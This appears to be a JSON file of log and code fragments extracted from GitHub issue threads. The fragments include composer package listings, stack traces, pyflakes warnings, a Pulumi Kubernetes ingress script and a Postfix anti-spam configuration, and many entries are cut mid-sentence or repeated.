        "logs": "`\n<issue_comment>username_2: @username_3 great comments. Do you mind adding these as review comments on the pull request? it's easier to triage them that way.\r\n\r\nA few quick comments, although I'd encourage you to read through the [readme](https://github.com/accounts-js/accounts/blob/1af9dc6a7d80dee5818b8e778f1277cdbd9ed301/packages/nestjs/README.md) first, It seems like several of these are answered in there\r\n\r\n- a @Public decorator, or some way to override/ignore higher priority decorators is a good idea. Not sure how i'd implement that right now though.\r\n- Server options and services will be passed to new AccountServer so that you don't need to instantiate one yourself. That should be documented in the "
    },
    {
        "logs": "` option. See the [readme](https://github.com/accounts-js/accounts/blob/1af9dc6a7d80dee5818b8e778f1277cdbd9ed301/packages/nestjs/README.md) for a run down.\r\n- As for Graphql context and figuring out which is which, I was trying to develop somethigng that could be used by the nest community. But see this line for a comment on how nest is handling this internally soon https://github.com/accounts-js/accounts/blob/1af9dc6a7d80dee5818b8e778f1277cdbd9ed301/packages/nestjs/src/guards/Auth.guard.ts#L10 the only issue is that @nestjs/graphql doesn't have the necessary updates yet.\r\n- TypeORM connection - Sure! you can use the OptionsFactory option to break out the nestjs-accounts options into a class. Then you can [inject the typeorm connection with "
    },
    {
        "logs": "`\r\n$ composer show --latest 'sonata-project/*'\r\nsonata-project/admin-bundle              3.80.0 3.88.0 The missing Symfony Admin Generator\r\nsonata-project/block-bundle              3.21.0 4.5.0  Symfony SonataBlockBundle\r\nsonata-project/cache                     2.0.1  2.1.0  Cache library\r\nsonata-project/cache-bundle              3.2.1  3.2.1  This bundle provides caching services\r\nsonata-project/classification-bundle     3.14.0 3.14.0 Symfony SonataClassificationBundle\r\nsonata-project/datagrid-bundle           3.2.0  3.2.0  Symfony SonataDatagridBundle\r\nsonata-project/doctrine-extensions       1.11.0 1.11.0 Doctrine2 behavioral extensions\r\nsonata-project/doctrine-orm-admin-bundle 3.26.0 3.27.0 Integrate Doctrine ORM into the SonataAdminBundle\r\nsonata-project/easy-extends-bundle       2.5.0  2.5.0  Symfony SonataEasyExtendsBundle\r\nsonata-project/exporter                  2.5.0  2.5.0  Lightweight Exporter library\r\nsonata-project/form-extensions           1.8.1  1.8.1  Symfony form extensions\r\nsonata-project/formatter-bundle          4.3.0  4.3.0  Symfony SonataFormatterBundle\r\nsonata-project/intl-bundle               2.10.0 2.10.0 Symfony SonataIntlBundle\r\nsonata-project/media-bundle              3.29.0 3.29.0 Symfony SonataMediaBundle\r\nsonata-project/seo-bundle                2.12.0 2.12.0 Symfony SonataSeoBundle\r\nsonata-project/twig-extensions           1.5.0  1.5.0  Sonata twig extensions\r\nsonata-project/user-bundle               4.10.1 4.10.1 Symfony SonataUserBundle\r\n"
    },
    {
        "logs": "`\r\n$ composer show --latest 'symfony/*'\r\nsymfony/acl-bundle                 v2.0.0  v2.0.0  Symfony AclBundle\r\nsymfony/asset                      v4.4.18 v5.2.1  Symfony Asset Component\r\nsymfony/browser-kit                v4.4.18 v5.2.1  Symfony BrowserKit Component\r\nsymfony/cache                      v4.4.18 v5.2.1  Symfony Cache component with PSR-6, PSR-16, and tags\r\nsymfony/cache-contracts            v2.2.0  v2.2.0  Generic abstractions related to caching\r\nsymfony/config                     v4.4.18 v5.2.1  Symfony Config Component\r\nsymfony/console                    v4.4.18 v5.2.1  Symfony Console Component\r\nsymfony/css-selector               v4.4.18 v5.2.1  Symfony CssSelector Component\r\nsymfony/debug                      v4.4.18 v4.4.18 Symfony Debug Component\r\nsymfony/dependency-injection       v4.4.18 v5.2.1  Symfony DependencyInjection Component\r\nsymfony/deprecation-contracts      v2.2.0  v2.2.0  A generic function and convention to trigger deprecation notices\r\nsymfony/doctrine-bridge            v4.4.18 v5.2.1  Symfony Doctrine Bridge\r\nsymfony/dom-crawler                v4.4.18 v5.2.1  Symfony DomCrawler Component\r\nsymfony/dotenv                     v4.4.18 v5.2.1  Registers environment variables from a .env file\r\nsymfony/error-handler              v4.4.18 v5.2.1  Symfony ErrorHandler Component\r\nsymfony/event-dispatcher           v4.4.18 v5.2.1  Symfony EventDispatcher Component\r\nsymfony/event-dispatcher-contracts v1.1.9  v2.2.0  Generic abstractions related to dispatching event\r\nsymfony/expression-language        v4.4.18 v5.2.1  Symfony ExpressionLanguage Component\r\nsymfony/filesystem                 v4.4.18 v5.2.1  Symfony Filesystem Component\r\nsymfony/finder                     v4.4.18 v5.2.1  Symfony Finder Component\r\nsymfony/flex                       v1.11.0 v1.11.0 Composer plugin for Symfony\r\nsymfony/form                       v4.4.18 v5.2.1  Symfony Form Component\r\nsymfony/framework-bundle           v4.4.18 v5.2.1  Symfony FrameworkBundle\r\nsymfony/http-client                v4.4.18 v5.2.1  Symfony HttpClient component\r\nsymfony/http-client-contracts      v2.3.1  v2.3.1  Generic abstractions related to HTTP clients\r\nsymfony/http-foundation            v4.4.18 v5.2.1  Symfony HttpFoundation Component\r\nsymfony/http-kernel                v4.4.18 v5.2.1  Symfony HttpKernel Component\r\nsymfony/inflector                  v4.4.18 v5.2.1  Symfony Inflector Component\r\nsymfony/intl                       v4.4.18 v5.2.1  A PHP replacement layer for the C intl extension that includes additional data from the ICU library.\r\nsymfony/mailer                     v4.4.18 v5.2.1  Symfony Mailer Component\r\nsymfony/maker-bundle               v1.28.0 v1.28.0 Symfony Maker helps you create empty commands, controllers, form classes, tests and more so you can forget about writing boilerplate code.\r\nsymfony/messenger                  v4.4.18 v5.2.1  Symfony Messenger Component\r\nsymfony/mime                       v4.4.18 v5.2.1  A library to manipulate MIME messages\r\nsymfony/monolog-bridge             v4.4.18 v5.2.1  Symfony Monolog Bridge\r\nsymfony/monolog-bundle             v3.6.0  v3.6.0  Symfony MonologBundle\r\nsymfony/options-resolver           v4.4.18 v5.2.1  Symfony OptionsResolver Component\r\nsymfony/orm-pack                   v1.0.8  v2.1.0  A pack for the Doctrine ORM\r\nsymfony/phpunit-bridge             v5.2.1  v5.2.1  Symfony PHPUnit Bridge\r\nsymfony/polyfill-intl-grapheme     v1.22.0 v1.22.0 Symfony polyfill for intl's grapheme_* functions\r\nsymfony/polyfill-intl-icu          v1.22.0 v1.22.0 Symfony polyfill for intl's ICU-related data and classes\r\nsymfony/polyfill-intl-idn          v1.22.0 v1.22.0 Symfony polyfill for intl's idn_to_ascii and idn_to_utf8 functions\r\nsymfony/polyfill-intl-normalizer   v1.22.0 v1.22.0 Symfony polyfill for intl's Normalizer class and related functions\r\n[Truncated]\n\r\nThe admin shows 'no' while the related object holds a 'true' value\r\n\r\n## Additional information\r\n\r\nWhen dumping the variables I can see "
    },
    {
        "logs": "`\n<issue_comment>username_1: You messed up your property/getter.\r\n\r\nWhen looking for foo, we're trying getFoo, hasFoo, isFoo.\r\nHere it's isRemix, so we try getIsRemix, hasIsRemix and isIsRemix.\r\n\r\nIf your getter is "
    },
    {
        "logs": "`.\r\n\r\nBut maybe we can add the name of the field in the list of the getter we try.\n<issue_comment>username_0: You are correct, when adding the method the list-values (and filters) work like expected;\r\n\r\n"
    },
    {
        "logs": "`\r\n\r\nSo if there would be another way within Sonata Admin to set this getter's name or try this type of naming this issue would be a feature request.\r\n\r\nIn any other case I'll have to refactor the entity to confirm to the conventions. I'm not sure if these are documented anywhere though. I might've missed it.\r\n\r\nThanks for clearing this up so fast.\n<issue_comment>username_2: I run into the same problem and I see it a bit tricky since if you create an admin for the "
    },
    {
        "logs": "```\r\nNoMethodError: undefined method `next_sync_url' for #<Array:0x007facad5719d8>\r\n/opt/rubies/2.2.4/lib/ruby/gems/2.2.0/bundler/gems/contentful.rb-82950e733e3e/lib/contentful/sync.rb:82:in `update_sync_state_from!'\r\n/opt/rubies/2.2.4/lib/ruby/gems/2.2.0/bundler/gems/contentful.rb-82950e733e3e/lib/contentful/sync.rb:65:in `get'\r\n/opt/rubies/2.2.4/lib/ruby/gems/2.2.0/bundler/gems/contentful.rb-82950e733e3e/lib/contentful/sync.rb:37:in `first_page'\r\n/opt/rubies/2.2.4/lib/ruby/gems/2.2.0/bundler/gems/contentful.rb-82950e733e3e/lib/contentful/sync.rb:24:in `each_page'\r\n/opt/rubies/2.2.4/lib/ruby/gems/2.2.0/bundler/gems/contentful.rb-82950e733e3e/lib/contentful/sync.rb:53:in `each_item'\r\n"
    },
    {
        "logs": "`ruby\r\n\r\nrequired(:foo).maybe(:none?)\r\n\r\nresult = form.call('foo' => '23')\r\n\r\n__END__\r\n\r\nExpected:\r\n  false\r\n  [\"cannot be defined\"]\r\n\r\nActual:\r\n  false\r\n  [\"is missing\"]\r\n"
    },
    {
        "logs": "```ruby\r\n\r\nrequired(:foo).maybe(:none?)\r\n\r\nresult = form.call('foo' => '23')\r\n\r\n__END__\r\n\r\nExpected:\r\n  false\r\n  [\"cannot be defined\"]\r\n\r\nActual:\r\n  false\r\n  [\"is missing\"]\r\n"
    },
    {
        "logs": "`\r\nDueCredit Report:\r\n- Access a cacophony of neuro-imaging file formats / nibabel (v 2.0.2) [1]\r\n- Nipype: a flexible, lightweight and extensible neuroimaging data processing framework in Python / nipype (v UNKNOWN) [2, 3]\r\n- Scientific tools library / numpy (v 1.11) [4]\r\n- Scientific tools library / scipy (v 0.17) [5]\r\n\r\n4 packages cited\r\n0 modules cited\r\n0 functions cited\r\n\r\nReferences\r\n----------\r\n\r\n[1] Url('http://nipy.org/nibabel', key='http://nipy.org/nibabel')\r\n[2] 2016-05-04 10:21:56,128 [ERROR  ] Failed to process BibTeX file /tmp/alexandre/tmpz9hwm8k4.bib: 'data' (io.py:269)\r\n160504-10:21:56,128 duecredit ERROR  :\r\n\t Failed to process BibTeX file /tmp/alexandre/tmpz9hwm8k4.bib: 'data'\r\nERRORED: 'data'\r\n[3] Gorgolewski, K. et al., 2011. Nipype: A Flexible, Lightweight and Extensible Neuroimaging Data Processing Framework in Python. Frontiers in Neuroinformatics, 5.\r\n[4] Van Der Walt, S., Colbert, S.C. & Varoquaux, G., 2011. The NumPy array: a structure for efficient numerical computation. Computing in Science & Engineering, 13(2), pp.22\u201330.\r\n[5] Jones, E. et al., 2001. SciPy: Open source scientific tools for Python.\r\n"
    },
    {
        "logs": "```\r\nDueCredit Report:\r\n- Access a cacophony of neuro-imaging file formats / nibabel (v 2.0.2) [1]\r\n- Nipype: a flexible, lightweight and extensible neuroimaging data processing framework in Python / nipype (v UNKNOWN) [2, 3]\r\n- Scientific tools library / numpy (v 1.11) [4]\r\n- Scientific tools library / scipy (v 0.17) [5]\r\n\r\n4 packages cited\r\n0 modules cited\r\n0 functions cited\r\n\r\nReferences\r\n----------\r\n\r\n[1] Url('http://nipy.org/nibabel', key='http://nipy.org/nibabel')\r\n[2] 2016-05-04 10:21:56,128 [ERROR  ] Failed to process BibTeX file /tmp/alexandre/tmpz9hwm8k4.bib: 'data' (io.py:269)\r\n160504-10:21:56,128 duecredit ERROR  :\r\n\t Failed to process BibTeX file /tmp/alexandre/tmpz9hwm8k4.bib: 'data'\r\nERRORED: 'data'\r\n[3] Gorgolewski, K. et al., 2011. Nipype: A Flexible, Lightweight and Extensible Neuroimaging Data Processing Framework in Python. Frontiers in Neuroinformatics, 5.\r\n[4] Van Der Walt, S., Colbert, S.C. & Varoquaux, G., 2011. The NumPy array: a structure for efficient numerical computation. Computing in Science & Engineering, 13(2), pp.22\u201330.\r\n[5] Jones, E. et al., 2001. SciPy: Open source scientific tools for Python.\r\n"
    },
    {
        "logs": "` console\r\n$ git describe\r\nv1.6.7-13-gb1ac118\r\n$ pyflakes test_local.py \r\ntest_local.py:15: 'plumbum._testtools.xfail_on_pypy' imported but unused\r\ntest_local.py:291: 'plumbum.cmd.non_exist1N9' imported but unused\r\ntest_local.py:403: 'plumbum.cmd.cat' imported but unused\r\ntest_local.py:403: 'plumbum.cmd.head' imported but unused\r\ntest_local.py:564: 'plumbum.cmd.cat' imported but unused\r\ntest_local.py:576: 'plumbum.cmd.cat' imported but unused\r\ntest_local.py:770: redefinition of unused 'test_contains' from line 343\r\ntest_local.py:796: redefinition of unused 'test_redirection' from line 420\r\ntest_local.py:820: redefinition of unused 'test_popen' from line 444\r\ntest_local.py:829: redefinition of unused 'test_run' from line 453\r\ntest_local.py:835: redefinition of unused 'test_timeout' from line 459\r\ntest_local.py:840: redefinition of unused 'test_pipe_stderr' from line 464\r\ntest_local.py:851: redefinition of unused 'test_fair_error_attribution' from line 475\r\ntest_local.py:861: redefinition of unused 'test_iter_lines_timeout' from line 485\r\ntest_local.py:873: redefinition of unused 'test_iter_lines_error' from line 497\r\ntest_local.py:883: redefinition of unused 'test_modifiers' from line 507\r\ntest_local.py:898: redefinition of unused 'test_tee_modifier' from line 522\r\ntest_local.py:908: redefinition of unused 'test_arg_expansion' from line 532\r\ntest_local.py:914: redefinition of unused 'test_session' from line 538\r\ntest_local.py:926: redefinition of unused 'test_quoting' from line 550\r\ntest_local.py:939: redefinition of unused 'test_tempdir' from line 563\r\ntest_local.py:940: 'plumbum.cmd.cat' imported but unused\r\ntest_local.py:951: redefinition of unused 'test_direct_open_tmpdir' from line 575\r\ntest_local.py:952: 'plumbum.cmd.cat' imported but unused\r\ntest_local.py:964: redefinition of unused 'test_read_write_str' from line 588\r\ntest_local.py:970: redefinition of unused 'test_read_write_unicode' from line 594\r\ntest_local.py:976: redefinition of unused 'test_read_write_bin' from line 600\r\ntest_local.py:982: redefinition of unused 'test_links' from line 606\r\ntest_local.py:994: redefinition of unused 'test_list_processes' from line 618\r\ntest_local.py:997: redefinition of unused 'test_pgrep' from line 621\r\ntest_local.py:1000: redefinition of unused '_generate_sigint' from line 624\r\ntest_local.py:1009: redefinition of unused 'test_same_sesion' from line 633\r\ntest_local.py:1019: redefinition of unused 'test_new_session' from line 643\r\ntest_local.py:1029: redefinition of unused 'test_local_daemon' from line 653\r\ntest_local.py:1036: redefinition of unused 'test_atomic_file' from line 660\r\ntest_local.py:1046: redefinition of unused 'test_atomic_file2' from line 670\r\ntest_local.py:1065: redefinition of unused 'test_pid_file' from line 689\r\ntest_local.py:1081: redefinition of unused 'test_atomic_counter' from line 705\r\ntest_local.py:1111: redefinition of unused 'test_atomic_counter2' from line 735\r\ntest_local.py:1129: redefinition of unused 'test_bound_env' from line 753\r\ntest_local.py:1141: redefinition of unused 'test_nesting_lists_as_argv' from line 765\r\ntest_local.py:1146: redefinition of unused 'test_contains' from line 770\r\ntest_local.py:1149: redefinition of unused 'test_issue_139' from line 773\r\ntest_local.py:1152: redefinition of unused 'test_pipeline_failure' from line 776\r\ntest_local.py:1157: redefinition of unused 'test_pipeline_retcode' from line 781\r\ntest_local.py:1165: redefinition of unused 'test_pipeline_stdin' from line 789\r\n"
    },
    {
        "logs": "``` console\r\n$ git describe\r\nv1.6.7-13-gb1ac118\r\n$ pyflakes test_local.py \r\ntest_local.py:15: 'plumbum._testtools.xfail_on_pypy' imported but unused\r\ntest_local.py:291: 'plumbum.cmd.non_exist1N9' imported but unused\r\ntest_local.py:403: 'plumbum.cmd.cat' imported but unused\r\ntest_local.py:403: 'plumbum.cmd.head' imported but unused\r\ntest_local.py:564: 'plumbum.cmd.cat' imported but unused\r\ntest_local.py:576: 'plumbum.cmd.cat' imported but unused\r\ntest_local.py:770: redefinition of unused 'test_contains' from line 343\r\ntest_local.py:796: redefinition of unused 'test_redirection' from line 420\r\ntest_local.py:820: redefinition of unused 'test_popen' from line 444\r\ntest_local.py:829: redefinition of unused 'test_run' from line 453\r\ntest_local.py:835: redefinition of unused 'test_timeout' from line 459\r\ntest_local.py:840: redefinition of unused 'test_pipe_stderr' from line 464\r\ntest_local.py:851: redefinition of unused 'test_fair_error_attribution' from line 475\r\ntest_local.py:861: redefinition of unused 'test_iter_lines_timeout' from line 485\r\ntest_local.py:873: redefinition of unused 'test_iter_lines_error' from line 497\r\ntest_local.py:883: redefinition of unused 'test_modifiers' from line 507\r\ntest_local.py:898: redefinition of unused 'test_tee_modifier' from line 522\r\ntest_local.py:908: redefinition of unused 'test_arg_expansion' from line 532\r\ntest_local.py:914: redefinition of unused 'test_session' from line 538\r\ntest_local.py:926: redefinition of unused 'test_quoting' from line 550\r\ntest_local.py:939: redefinition of unused 'test_tempdir' from line 563\r\ntest_local.py:940: 'plumbum.cmd.cat' imported but unused\r\ntest_local.py:951: redefinition of unused 'test_direct_open_tmpdir' from line 575\r\ntest_local.py:952: 'plumbum.cmd.cat' imported but unused\r\ntest_local.py:964: redefinition of unused 'test_read_write_str' from line 588\r\ntest_local.py:970: redefinition of unused 'test_read_write_unicode' from line 594\r\ntest_local.py:976: redefinition of unused 'test_read_write_bin' from line 600\r\ntest_local.py:982: redefinition of unused 'test_links' from line 606\r\ntest_local.py:994: redefinition of unused 'test_list_processes' from line 618\r\ntest_local.py:997: redefinition of unused 'test_pgrep' from line 621\r\ntest_local.py:1000: redefinition of unused '_generate_sigint' from line 624\r\ntest_local.py:1009: redefinition of unused 'test_same_sesion' from line 633\r\ntest_local.py:1019: redefinition of unused 'test_new_session' from line 643\r\ntest_local.py:1029: redefinition of unused 'test_local_daemon' from line 653\r\ntest_local.py:1036: redefinition of unused 'test_atomic_file' from line 660\r\ntest_local.py:1046: redefinition of unused 'test_atomic_file2' from line 670\r\ntest_local.py:1065: redefinition of unused 'test_pid_file' from line 689\r\ntest_local.py:1081: redefinition of unused 'test_atomic_counter' from line 705\r\ntest_local.py:1111: redefinition of unused 'test_atomic_counter2' from line 735\r\ntest_local.py:1129: redefinition of unused 'test_bound_env' from line 753\r\ntest_local.py:1141: redefinition of unused 'test_nesting_lists_as_argv' from line 765\r\ntest_local.py:1146: redefinition of unused 'test_contains' from line 770\r\ntest_local.py:1149: redefinition of unused 'test_issue_139' from line 773\r\ntest_local.py:1152: redefinition of unused 'test_pipeline_failure' from line 776\r\ntest_local.py:1157: redefinition of unused 'test_pipeline_retcode' from line 781\r\ntest_local.py:1165: redefinition of unused 'test_pipeline_stdin' from line 789\r\n"
    },
    {
        "logs": "`\r\n<Error>\r\n<Message>An error has occurred.</Message>\r\n<ExceptionMessage>\r\nConversion failed when converting the nvarchar value 'logo.png' to data type int.\r\n</ExceptionMessage>\r\n<ExceptionType>System.Data.SqlClient.SqlException</ExceptionType>\r\n<StackTrace>\r\nat System.Data.SqlClient.SqlConnection.OnError(SqlException exception, Boolean breakConnection, Action"
    },
    {
        "logs": "`\r\nOk, so there must be something wrong with the \"Dnn.PersonaBar.Sites.Services.SitesController.GetPortals(Int32 portalGroupId, String filter, Int32 pageIndex, Int32 pageSize)\" Method which lead me to the GetPortalsByName Procedure. The sql code looks fine but when I ran it gave me the error in this particular t-sql \r\n\r\n"
    },
    {
        "logs": "```\r\n<Error>\r\n<Message>An error has occurred.</Message>\r\n<ExceptionMessage>\r\nConversion failed when converting the nvarchar value 'logo.png' to data type int.\r\n</ExceptionMessage>\r\n<ExceptionType>System.Data.SqlClient.SqlException</ExceptionType>\r\n<StackTrace>\r\nat System.Data.SqlClient.SqlConnection.OnError(SqlException exception, Boolean breakConnection, Action`1 wrapCloseInAction) at System.Data.SqlClient.TdsParser.ThrowExceptionAndWarning(TdsParserStateObject stateObj, Boolean callerHasConnectionLock, Boolean asyncClose) at System.Data.SqlClient.TdsParser.TryRun(RunBehavior runBehavior, SqlCommand cmdHandler, SqlDataReader dataStream, BulkCopySimpleResultSet bulkCopyHandler, TdsParserStateObject stateObj, Boolean& dataReady) at System.Data.SqlClient.SqlDataReader.TryHasMoreRows(Boolean& moreRows) at System.Data.SqlClient.SqlDataReader.TryReadInternal(Boolean setTimeout, Boolean& more) at System.Data.SqlClient.SqlDataReader.Read() at DotNetNuke.Common.Utilities.CBO.FillListFromReader(Type objType, IDataReader dr, IList objList, Boolean closeReader) at DotNetNuke.Common.Utilities.CBO.FillCollection(IDataReader dr, Type& objType, Int32& totalRecords) at DotNetNuke.Entities.Portals.PortalController.GetPortalsByName(String nameToMatch, Int32 pageIndex, Int32 pageSize, Int32& totalRecords) at Dnn.PersonaBar.Sites.Services.SitesController.GetPortals(Int32 portalGroupId, String filter, Int32 pageIndex, Int32 pageSize)\r\n</StackTrace>\r\n</Error>\r\n\r\n"
    },
    {
        "logs": "`\r\nPlan apply failed: 1 error occurred:\r\n        * the Kubernetes API server reported that \"ingress-basic/nginx-ingress-controller\" failed to fully initialize or become live: Service \"nginx-ingress-controller\" is invalid: spec.clusterIP: Invalid value: \"\": field is immutable\r\n"
    },
    {
        "logs": "`js\r\nconst ingressNamespace = new k8s.core.v1.Namespace(\"ingress-basic\", {\r\n    metadata: {\r\n        name: \"ingress-basic\"\r\n    }\r\n  }, { provider: k8sProvider });\r\n\r\n\r\n// https://github.com/pulumi/pulumi-kubernetes/issues/217#issuecomment-459105809\r\nfunction addNamespace(o) {\r\n    if (o !== undefined) {\r\n        if (o.metadata !== undefined) {\r\n            o.metadata.namespace = ingressNamespace.metadata.name;\r\n        } else {\r\n            o.metadata = {namespace: ingressNamespace.metadata.name}\r\n        }\r\n    }\r\n}\r\n\r\n\r\nfunction fixAutomountServiceAccountToken(obj, opts){\r\n    if (obj.kind === \"ServiceAccount\") {\r\n        opts.automountServiceAccountToken = true;\r\n    }\r\n\r\n    if (obj.kind === \"Pod\") {\r\n        obj.spec.automountServiceAccountToken = true;\r\n    }\r\n}\r\n\r\nconst ingressDeployment = new k8s.helm.v2.Chart(\"nginx-ingress\", {\r\n    repo: \"stable\",\r\n    chart: \"nginx-ingress\",\r\n    namespace: ingressNamespace.metadata.name,\r\n    values: {\r\n        controller: {\r\n            replicaCount: 1,\r\n            nodeSelector: { \"beta\\\\.kubernetes\\\\.io/os\": \"linux\"},\r\n            service: {\r\n                externalTrafficPolicy: \"Local\",\r\n                // https://github.com/terraform-providers/terraform-provider-azurerm/pull/4400\r\n                // loadBalancerIP: ingressStaticIP.ipAddress\r\n            }\r\n        },\r\n        defaultBackend: { nodeSelector: { \"beta\\\\.kubernetes\\\\.io/os\": \"linux\" }},\r\n        rbac: { create: true },\r\n    },\r\n    transformations: [ addNamespace, fixAutomountServiceAccountToken ]\r\n}, {\r\n    providers: { kubernetes: k8sProvider },\r\n    dependsOn: [ingressNamespace]\r\n});\r\n"
    },
    {
        "logs": "```\r\nPlan apply failed: 1 error occurred:\r\n        * the Kubernetes API server reported that \"ingress-basic/nginx-ingress-controller\" failed to fully initialize or become live: Service \"nginx-ingress-controller\" is invalid: spec.clusterIP: Invalid value: \"\": field is immutable\r\n"
    },
    {
        "logs": "```js\r\nconst ingressNamespace = new k8s.core.v1.Namespace(\"ingress-basic\", {\r\n    metadata: {\r\n        name: \"ingress-basic\"\r\n    }\r\n  }, { provider: k8sProvider });\r\n\r\n\r\n// https://github.com/pulumi/pulumi-kubernetes/issues/217#issuecomment-459105809\r\nfunction addNamespace(o) {\r\n    if (o !== undefined) {\r\n        if (o.metadata !== undefined) {\r\n            o.metadata.namespace = ingressNamespace.metadata.name;\r\n        } else {\r\n            o.metadata = {namespace: ingressNamespace.metadata.name}\r\n        }\r\n    }\r\n}\r\n\r\n\r\nfunction fixAutomountServiceAccountToken(obj, opts){\r\n    if (obj.kind === \"ServiceAccount\") {\r\n        opts.automountServiceAccountToken = true;\r\n    }\r\n\r\n    if (obj.kind === \"Pod\") {\r\n        obj.spec.automountServiceAccountToken = true;\r\n    }\r\n}\r\n\r\nconst ingressDeployment = new k8s.helm.v2.Chart(\"nginx-ingress\", {\r\n    repo: \"stable\",\r\n    chart: \"nginx-ingress\",\r\n    namespace: ingressNamespace.metadata.name,\r\n    values: {\r\n        controller: {\r\n            replicaCount: 1,\r\n            nodeSelector: { \"beta\\\\.kubernetes\\\\.io/os\": \"linux\"},\r\n            service: {\r\n                externalTrafficPolicy: \"Local\",\r\n                // https://github.com/terraform-providers/terraform-provider-azurerm/pull/4400\r\n                // loadBalancerIP: ingressStaticIP.ipAddress\r\n            }\r\n        },\r\n        defaultBackend: { nodeSelector: { \"beta\\\\.kubernetes\\\\.io/os\": \"linux\" }},\r\n        rbac: { create: true },\r\n    },\r\n    transformations: [ addNamespace, fixAutomountServiceAccountToken ]\r\n}, {\r\n    providers: { kubernetes: k8sProvider },\r\n    dependsOn: [ingressNamespace]\r\n});\r\n"
    },
    {
        "logs": "`\r\n[instance-manager-r-8a4c54fc] [test1-r-da744d57] time=\"2019-09-27T22:34:24Z\" level=fatal msg=\"Error running start replica command: mkdir /host/var/lib/rancher/longhorn/replicas/test1-5e718a22: no such file or directory\"\r\n[instance-manager-r-8a4c54fc] [longhorn-instance-manager] time=\"2019-09-27T22:34:24Z\" level=info msg=\"Process Manager: process test1-r-da744d57 error out, error msg: exit status 1\"\r\n[instance-manager-r-8a4c54fc] [longhorn-instance-manager] time=\"2019-09-27T22:34:24Z\" level=info msg=\"Process Manager: prepare to create process test1-r-da744d57\"\r\n"
    },
    {
        "logs": "`\r\n      355   Accepted                                    85.34%\r\n       61   Rejected                                    14.66%\r\n --------   --------------------------------------------------\r\n      416   Total                                      100.00%\r\n ========   ==================================================\r\n \r\n       61   5xx Reject RBL                             100.00%\r\n --------   --------------------------------------------------\r\n       61   Total 5xx Rejects                          100.00%\r\n ========   ==================================================\r\n \r\n        1   4xx Reject sender address                  100.00%\r\n --------   --------------------------------------------------\r\n        1   Total 4xx Rejects                          100.00%\r\n ========   ==================================================\r\n"
    },
    {
        "logs": "`\r\n# Settings to prevent SPAM early\r\nsmtpd_helo_required = yes\r\nsmtpd_delay_reject = yes\r\nsmtpd_helo_restrictions = permit_mynetworks, reject_invalid_helo_hostname, permit\r\nsmtpd_relay_restrictions = permit_mynetworks permit_sasl_authenticated defer_unauth_destination\r\nsmtpd_recipient_restrictions = permit_sasl_authenticated, permit_mynetworks, reject_unauth_destination, check_policy_service unix:private/policyd-spf, reject_unauth_pipelining, reject_invalid_helo_hostname, reject_non_fqdn_helo_hostname, reject_unknown_recipient_domain, check_policy_service inet:localhost:65265, reject_rbl_client zen.spamhaus.org\r\nsmtpd_client_restrictions = permit_mynetworks, permit_sasl_authenticated, reject_unauth_destination, reject_unauth_pipelining\r\nsmtpd_sender_restrictions = reject_authenticated_sender_login_mismatch, permit_sasl_authenticated, permit_mynetworks, reject_unknown_sender_domain\r\ndisable_vrfy_command = yes\r\n\r\n# Postscreen settings to drop zombies/open relays/spam early\r\npostscreen_dnsbl_action = enforce\r\npostscreen_dnsbl_sites =\r\n        bl.mailspike.net\r\n        b.barracudacentral.org*2\r\n        bl.spameatingmonkey.net\r\n        dnsbl.sorbs.net\r\n        psbl.surriel.com\r\n        list.dnswl.org=127.0.[0..255].0*-2\r\n        list.dnswl.org=127.0.[0..255].1*-3\r\n        list.dnswl.org=127.0.[0..255].[2..3]*-4\r\npostscreen_dnsbl_threshold = 3\r\npostscreen_dnsbl_whitelist_threshold = -1\r\npostscreen_greet_action = enforce\r\npostscreen_bare_newline_action = enforce\r\n"
    },
    {
        "logs": "```\r\n      355   Accepted                                    85.34%\r\n       61   Rejected                                    14.66%\r\n --------   --------------------------------------------------\r\n      416   Total                                      100.00%\r\n ========   ==================================================\r\n \r\n       61   5xx Reject RBL                             100.00%\r\n --------   --------------------------------------------------\r\n       61   Total 5xx Rejects                          100.00%\r\n ========   ==================================================\r\n \r\n        1   4xx Reject sender address                  100.00%\r\n --------   --------------------------------------------------\r\n        1   Total 4xx Rejects                          100.00%\r\n ========   ==================================================\r\n"
    },
    {
        "logs": "```\r\n# Settings to prevent SPAM early\r\nsmtpd_helo_required = yes\r\nsmtpd_delay_reject = yes\r\nsmtpd_helo_restrictions = permit_mynetworks, reject_invalid_helo_hostname, permit\r\nsmtpd_relay_restrictions = permit_mynetworks permit_sasl_authenticated defer_unauth_destination\r\nsmtpd_recipient_restrictions = permit_sasl_authenticated, permit_mynetworks, reject_unauth_destination, check_policy_service unix:private/policyd-spf, reject_unauth_pipelining, reject_invalid_helo_hostname, reject_non_fqdn_helo_hostname, reject_unknown_recipient_domain, check_policy_service inet:localhost:65265, reject_rbl_client zen.spamhaus.org\r\nsmtpd_client_restrictions = permit_mynetworks, permit_sasl_authenticated, reject_unauth_destination, reject_unauth_pipelining\r\nsmtpd_sender_restrictions = reject_authenticated_sender_login_mismatch, permit_sasl_authenticated, permit_mynetworks, reject_unknown_sender_domain\r\ndisable_vrfy_command = yes\r\n\r\n# Postscreen settings to drop zombies/open relays/spam early\r\npostscreen_dnsbl_action = enforce\r\npostscreen_dnsbl_sites =\r\n        bl.mailspike.net\r\n        b.barracudacentral.org*2\r\n        bl.spameatingmonkey.net\r\n        dnsbl.sorbs.net\r\n        psbl.surriel.com\r\n        list.dnswl.org=127.0.[0..255].0*-2\r\n        list.dnswl.org=127.0.[0..255].1*-3\r\n        list.dnswl.org=127.0.[0..255].[2..3]*-4\r\npostscreen_dnsbl_threshold = 3\r\npostscreen_dnsbl_whitelist_threshold = -1\r\npostscreen_greet_action = enforce\r\npostscreen_bare_newline_action = enforce\r\n"
    },
    {
        "logs": "`python\r\n    import vak  # to avoid circular imports\r\n\r\n    predict_dst = Path(predict_dst).expanduser().resolve()\r\n    if not predict_dst.exists() or not predict_dst.is_dir():\r\n        raise NotADirectoryError(\r\n            f'predict_dst not found, or not recognized as a directory:\\n{predict_dst}'\r\n        )\r\n\r\n    extract_df = pd.read_csv(extract_csv_path)\r\n    extract_df = extract_df[extract_df.split == split]\r\n    clf = joblib.load(clf_path)\r\n\r\n    labelset = vak.converters.labelset_to_set(labelset)\r\n    labelmap = vak.labels.to_map(labelset, map_unlabeled=False)\r\n    inverse_labelmap = {v: k for k, v in labelmap.items()}\r\n\r\n    ftr_paths = extract_df.features_path.values.tolist()\r\n    ftr_dfs = []\r\n    for row_num, ftr_path in enumerate(tqdm(ftr_paths)):\r\n        ftr_df = pd.read_csv(ftr_path)\r\n        # \"foreign key\" maps back to row of resegment_df\r\n        # so we can figure out which predictions are for which row\r\n        ftr_df['foreign_key'] = row_num\r\n        